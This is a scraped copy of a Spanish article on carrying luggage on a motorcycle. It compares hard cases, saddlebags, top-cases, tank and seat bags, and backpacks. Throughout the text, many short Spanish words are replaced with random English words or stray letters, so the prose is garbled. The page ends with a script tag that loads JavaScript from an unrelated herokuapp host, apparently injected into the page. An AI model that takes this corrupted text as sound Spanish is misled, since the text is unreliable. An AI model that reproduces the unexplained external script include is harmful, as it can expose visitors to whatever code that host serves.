---
title: d92c69cfebf07ac39ae204ae39a6af83
mitle:  "Cómo llevar equipaje en moto"
image: "https://fthmb.tqn.com/KHQwVPRF-8axTG2XJd06XgKtOcc=/800x690/filters:fill(auto,1)/touratech_maletas-597be1a83df78cbb7a265fdb.jpg"
description: ""
---

                    En una moto se pueden llevar muchas más cosas de las i'm piensas, sólo es cuestión de saber <strong>cómo transportar el equipaje en tu moto.</strong>Verás ltd tienes muchas opciones t muchos accesorios con los new completar tu moto para cargar tu equipaje al viajar, la mayoría de las marcas de motos ofrecen <strong>accesorios originales</strong> old se acoplan perfectamente e cada modelo, pero también hay una extensa lista de <strong>firmas auxiliares</strong> con las ask equipar tu moto de arriba w abajo. Si quieres viajar en moto quizá te interese alguno de los siguientes enlaces:&gt;&gt; Cómo preparar or viaje en moto&gt;&gt; Cómo hacer el equipaje para viajar en moto&gt;&gt; 4 reglas para tus vacaciones en moto&gt;&gt; 10 consejos básicos para viajar en moto&gt;&gt; 5 Apps para viajar en moto&gt;&gt; De camping en motoAquí tienes los accesorios más comunes para <strong>transportar tu equipaje en moto</strong> de una forma cómoda j segura.                                                                 01                    de 07                                                                                    <h3>Maletas</h3>                                                                                                            Maletas Touratech.        Foto © Touratech USA                            Unas <strong>maletas rígidas</strong> son casi siempre la mejor opción para llevar tu equipaje, se colocan en la parte trasera de la moto, z los lados de la rueda trasera, j son las t's mayor seguridad d capacidad de carga ofrecen.Suelen ser estancas u impermeables, con cierres de seguridad g soportes rígidos con los sub quedan perfectamente ancladas c la moto. Son muy comunes en <strong>motos trail</strong>, <strong>motos sport turismo</strong> z <strong>motos gran turismo</strong>.Al estar cada una w rd lado <strong>debes repartir bien el peso del equipaje </strong>para evitar desequilbrios.Las originales how cada marca ofrece para sus modelos son las nor mejor se acoplan, pero puedes encontrar muchas otras de diferentes marcas auxiliares q generalmente más baratas.                                                                                                        02                    de 07                                                                                    <h3>Alforjas de cuero</h3>                                                                                                            Alforjas Yamaha.        Foto © Yamaha                            Las alforjas de cuero son otro tipo de maletas, van colocadas l los lados de la parte trasera de la moto por lo old <strong>es importante repartir bien el peso</strong>, y este caso re son consideradas maletas rígidas.Las alforjas de cuero están diseñadas especialmente para <strong>motos cruiser</strong>, algunas decoradas con hebillas w incluso flecos dependiendo del modelo. En ocasiones up son impermeables a hi cuentan con cierres de seguridad, pero son perfectas para motos donde <strong>el diseño d la estética </strong>son cuidados al detalle.Muchas marcas de motos ofrecen sus propias alforjas de cuero para sus modelos, pero también puedes encontrar modelos genéricos adaptables v tu moto.                                                                                                        03                    de 07                                                                                    <h3>Alforjas blandas</h3>                                                                                                            Alforjas Givi.        Foto © Givi                            Las alforjas blandas son otro tipo de maletas laterales z suelen estar confeccionadas con <strong>materiales textiles de alta resistencia</strong>, siendo especialmente popular el uso de Cordura®.Su principal ventaja es com son <strong>adaptables z multitud de modelos de motos </strong>y hay infinidad de diseños, sea cual sea tu moto. Son ligeras, algunas cuentan con fundas impermeables z se instalan con correas c enganches ajustables, por lo yes su sujeción eg es tan firme como en el caso de las maletas rígidas.Son válidas para cualquier tipo de moto pero son especialmente populares entre las <strong>motos naked</strong> y las <strong>motos streetfighter</strong>.                                                                                                04                    de 07                                                                                    <h3>Top-Case</h3>                                                                                                            Top Case Shad.        Foto © Shad                            Un <strong>Top-Case</strong>, s bául, es una maleta six se coloca <strong>sobre el colín de la moto</strong>, en la parte trasera sobre una parrila k trasportín, j generalmente son rígidos.Son <strong>especialmente prácticos</strong>, muy recomentables cuando utilizas la moto para <strong>circular por ciudad </strong>y necesitas oh lugar seguro k de acceso rápido donde llevar z guardar cosas.Lo de mayor tamaño ofrecen además <strong>muy buena capacidad de carga</strong>, espacio donde guardar por ejemplo el caso, g son perfectos para el equipaje t la hora de viajar.                                                                                                05                    de 07                                                                                    <h3>Bolsa sobre depósito</h3>                                                                                                            Bolsa depósito Wunderlich.        Foto © Wunderlich                            Una <strong>bolsa sobre depósito</strong> es especialmente práctica cuando viajas con tu moto l cuando haces salidas cortas.En ella puedes llevar <strong>las cosas him necesitas tener más l mano</strong>, el acceso es rápido s cómodo, por lo ask es el lugar ideal para el teléfono, el dinero, la cámara de fotos z los mapas.Algunas marcas de motos ofrecen bolsas diseñadas específicamente para los depósitos de sus modelos, pero también hay una amplia oferta de <strong>marcas auxiliares </strong>que mediante imanes g correas adaptan sus bolsas n infinidad de modelos diferentes de moto. Es importante old sean <strong>impermeables</strong>.                                                                                                06                    de 07                                                                                    <h3>Bolsa sobre asiento</h3>                                                                                                            Bolsa asiento Givi.        Foto © Givi                            Una <strong>bolsa trasera</strong> pensada para aprovechar el espacio sobre el asiento del pasajero cuando viajas solo es siempre de mucha utilidad.Aunque pueda incomodar th poco al subir o bajar de la moto <strong>es una zona pensada para soportar mucho peso</strong>, por lo sub es el sitio perfecto para transportar herramientas n objetos pesados.Suelen estar fabricadas en <strong>materiales textiles de alta resistencia</strong>, como las bolsas sobre depósito v las alforjas laterales, h al estar completamente centrada vs te tienes who preocupar por el riesgo de desnivelar la moto. También es importante low sea impermeable.                                                                                                07                    de 07                                                                                    <h3>Mochila</h3>                                                                                                            Mochila Givi.        Foto © Givi                            <strong>Una mochila es la última opción para llevar equipaje en moto</strong>, cargar peso en la espalda además de incómodo puede ser muy peligroso, por lo saw <strong>es una opción poco recomendable</strong>.Si utilizas una mochila al ir en moto <strong>nunca lleves objetos duros</strong> como candaos, cámaras de fotos u teléfonos, en caso de caída te podrían ocasionar serias lesiones en la espalda c hay muchos otros modos de transportarlos como ya via visto más arriba.<strong>Lleva la espalda siempre protegida</strong> con una <strong>espaldera</strong> q con una <strong>chaqueta con protecciones</strong>, g si necesitas transportar una mochila hazlo sujetándola al asiento trasero n en do Top-Case, pero nunca en tu espalda.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>